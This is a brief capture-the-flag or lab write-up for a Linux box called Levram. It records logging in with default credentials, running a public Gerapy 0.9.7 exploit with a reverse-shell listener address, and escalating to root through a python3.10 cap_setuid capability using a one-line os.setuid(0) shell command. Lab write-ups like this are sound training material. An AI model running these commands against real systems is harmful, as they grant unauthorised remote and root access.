# Levram (Linux)

## Initial foothold

- Accessed http://192.168.116.24:8000 with default credentials admin:admin.
- Used exploit `50640.py` targeting Gerapy 0.9.7.
- Created a project via the web interface at `/project`.
- Ran exploit command:
  ```bash
  python 50640.py -t 192.168.116.24 -p 8000 -L 192.168.45.166 -P 22
  ```

## Privilege Escalation

- Ran linpeas.sh and found `/usr/bin/python3.10` with `cap_setuid=ep` capability.
- Using resources like:
  - https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
  - https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html
- Executed:
  ```bash
  /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  ```

---

